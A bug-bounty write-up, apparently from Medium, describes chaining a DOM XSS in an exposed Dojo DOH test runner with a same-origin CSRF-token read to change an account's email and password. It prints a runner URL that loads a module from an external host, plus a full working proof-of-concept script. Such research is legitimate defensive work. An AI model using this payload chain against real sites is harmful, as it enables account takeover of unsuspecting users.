# One-Click Account Takeover via DOM XSS - How an Exposed Test Runner Opened the Door

- **Source URL:** https://medium.com/@forlaythegeneral/one-click-account-takeover-via-dom-xss-how-an-exposed-test-runner-opened-the-door-f0f826c4f74f
- **Fetched from:** https://medium.com/feed/@forlaythegeneral
- **Fetched:** 2026-11-20
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14992 (id 14992)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
*May the peace, mercy, and blessings of Allah be upon you.*

*A hidden endpoint led Fares and me to an exposed test runner. One crafted link later, our test account had a new email and password.*

That observation stayed with me while we explored the application. Later, my friend Fares found a DOM XSS entry point in an exposed Dojo test runner. Once we connected the two, a single visit to a crafted URL was enough to change our test account’s email and password.

Here is how we got there.

### The first clue: changing a password without knowing it

I started by browsing the application and checking the account settings at:

https://example.com/my\_data.php

The page allowed changes to profile information, email, and password. The password flow asked for a new password and its confirmation, but there was no current-password field.

My first thought was to look for a CSRF issue. If I could make a logged-in browser submit a password change, there would be no current password standing between that request and an account takeover.

I did not find a standalone CSRF bypass. The account update used a CSRF token, so the missing password check alone did not give us a working attack.

But it gave us a useful question to carry through the rest of the assessment: could we reach this action from somewhere else inside the application?

### The second clue: where the CSRF token came from

Looking at the account page’s HTML, I found an input named:

\<input name="c\_form\_token" value="REDACTED\_CSRF\_TOKEN">

A CSRF token appearing in a form’s HTML is normal. It is not a vulnerability by itself; the browser needs the token to submit the form, and an unrelated website normally cannot read that authenticated response. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html?utm_source=chatgpt.com)

The useful detail was that JavaScript running on the application’s own origin could request the account page and read the token from its response.

That gave us a possible chain:

1. Execute JavaScript on the same origin as the account page.
2. Request the account page using the logged-in session.
3. Extract a valid c\_form\_token.
4. Submit the email and password change using that token.

The missing piece was a way to execute JavaScript on that origin.

### Fares finds an unusual /report page

While exploring further, Fares used ffuf for content discovery and found:

https://example.com/report

The interface looked different from the main application and exposed a different set of functions. We had no credentials for that interface and no public registration flow, so we approached it through what was publicly accessible.

Fares reviewed its JavaScript files one by one. References in those files pointed toward another component used by the application. Following that lead brought us to an exposed Dojo DOH test runner:

https://example.com/layout/lib/js/util/doh/runner.html

DOH is Dojo’s testing harness. Its browser runner can load test modules selected through URL parameters, including the two below. [Dojo Toolkit](https://dojotoolkit.org/documentation/tutorials/1.6/recipes/doh_testsuite/index.html?utm_source=chatgpt.com)

ParameterPurposeregisterModulePathMaps a module namespace to a loading path.testModuleSelects the module to load and execute.

Research into the component led us to known XSS issues in Dojo’s testing utilities. Dojo’s release notes also document historical DOM XSS and JavaScript injection in DOH. We still needed to verify the behavior of this deployed runner. [The Dojo Toolkit Blog](https://dojotoolkit.org/blog/dojo-1-14-released?utm_source=chatgpt.com)

### Confirming DOM XSS

The exposed runner accepted an external module path supplied through the query string. To test execution first, we hosted a small module:

```
dojo.provide("poc.mod");
alert(1);
```
In this anonymized example, that file is served at:

https://payload.example.net/poc/mod.j

The corresponding runner URL is:

https://example.com/layout/lib/js/util/doh/runner.html?registerModulePath=poc,//payload.example.net/poc&testModule=poc.mod

registerModulePath maps the poc namespace to the external /poc directory, and testModule=poc.mod selects the module. The // prefix is a protocol-relative URL, so the HTTPS runner resolves that module path over HTTPS.

The browser loaded our external JavaScript, and the alert fired.

The important detail was the execution context: although the module came from an external host, its code ran inside the page at https://example.com. It therefore had access to the same-origin account page we had already examined.

The different appearance of the reporting interface did not create a browser security boundary. The runner and the account settings shared the same origin.

### Connecting the XSS to the account update

With JavaScript execution confirmed, we returned to the account settings flow. The runner was publicly reachable; the account takeover portion depended on the person opening the link having an active authenticated session.

The script did not need to know the current password or obtain the CSRF token in advance. It could read a fresh token through the test account’s existing session and then submit the update.

The sequence was:

StepActionUser interaction1A logged-in user opens the crafted runner URL.One click to open the link.2The runner loads the externally hosted module.Automatic.3The module requests /my\_data.php?frmnd=my\_data.Automatic.4It parses the response and reads c\_form\_token.Automatic.5It submits the email and password update with the token.Automatic.

The update was submitted to:

POST /my\_data.php?ch\_stage\_module\_my\_data\_2=execute&frmnd=my\_data

The following is a shortened, anonymized version of the submitted proof of concept. The account values are demonstration placeholders; the request paths and field names preserve the original flow.

`dojo.provide("poc.mod");````
dojo.provide("poc.mod");
(function () {
  if (window.location.hostname !== "example.com") return;
  // 1. Request the account page in the active session.
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "/my_data.php?frmnd=my_data", true);
  xhr.withCredentials = true;
  xhr.onload = function () {
    if (xhr.status !== 200) return;
    // 2. Read the CSRF token from the returned HTML.
    var doc = new DOMParser().parseFromString(
      xhr.responseText,
      "text/html"
    );
    var tokenInput = doc.querySelector('input[name="c_form_token"]');
    var csrfToken = tokenInput ? tokenInput.value : "";
    if (!csrfToken) return;
    // 3. Prepare the account update.
    var form = document.createElement("form");
    form.method = "POST";
    form.action =
      "/my_data.php?ch_stage_module_my_data_2=execute&frmnd=my_data";
    var fields = {
      ch_u_firstname_module_my_data_2: "Test",
      ch_u_name_module_my_data_2: "Account",
      ch_u_email_module_my_data_2: "takeover-test@example.net",
      ch_u_email2_module_my_data_2: "takeover-test@example.net",
      ch_u_passwd_module_my_data_2: "DemoPassword!42",
      ch_u_passwd2_module_my_data_2: "DemoPassword!42",
      frmnd: "my_data",
      c_form_token: csrfToken
    };
    Object.keys(fields).forEach(function (name) {
      var input = document.createElement("input");
      input.type = "hidden";
      input.name = name;
      input.value = fields[name];
      form.appendChild(input);
    });
    // 4. Submit the update using the valid token.
    document.body.appendChild(form);
    form.submit();
  };
  xhr.send();
})();The hostname check limits this example to the anonymized application host. The script stops if the account page cannot be fetched or the token is absent.
```
The external host serves the module. The token-reading request and account-update submission both go to the application’s origin. The script does not send the extracted token or account data back to the module host.

### What we verified on our test account

We used our own authenticated test account to demonstrate the complete sequence:

1. Log in and open the crafted runner URL in the same browser session.
2. Observe the request for the account page and the subsequent update submission.
3. Confirm that the account’s email and password changed.
4. Log out and verify access using the replacement credentials.

No current password was entered during the chain. After opening the link, the test did not require another click, a confirmation dialog, or credential entry.

That is what “one-click” means in this write-up: with the test account already authenticated, opening the crafted URL triggered the remaining steps automatically. The result was demonstrated in that browser and session setup.

### Why the token and cookie protections did not break the chain

**The CSRF token remained valid.** We had not guessed it or bypassed its validation. The XSS read a genuine token from the authenticated account page and submitted it with the update. This is the distinction that made the earlier observation useful: same-origin script execution gave us access to something an unrelated website could not normally read. OWASP’s CSRF guidance explains why XSS can defeat CSRF defenses. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html?utm_source=chatgpt.com)

**Cookie theft was unnecessary.** An HttpOnly cookie cannot be read through document.cookie, but the browser can still attach it to applicable JavaScript-initiated requests. The proof of concept used the session through requests to the application; it did not need to read the session cookie’s value. [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com)

**SameSite is not a general XSS defense.** It affects cookie sending in cross-site contexts. Whether a session is available when a link is first opened depends on the cookie settings and navigation context. Once the script has an authenticated same-origin context, SameSite does not prevent it from requesting the account page and submitting the update. [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com)

The absent current-password check then mattered at the final step: the account-update handler accepted the new credentials without requiring a secret the script did not already have.

### What made this finding work

The account settings page gave us a sensitive action that could be completed without the current password. The HTML response showed where its CSRF token could be obtained. Fares’s content discovery and JavaScript review gave us execution on the same origin.

Each observation answered a different part of the problem. Connecting them let us demonstrate the full path from opening a link to changing the test account’s email and password.

Credit to Fares for finding the DOM XSS entry point and working with me on the chain.
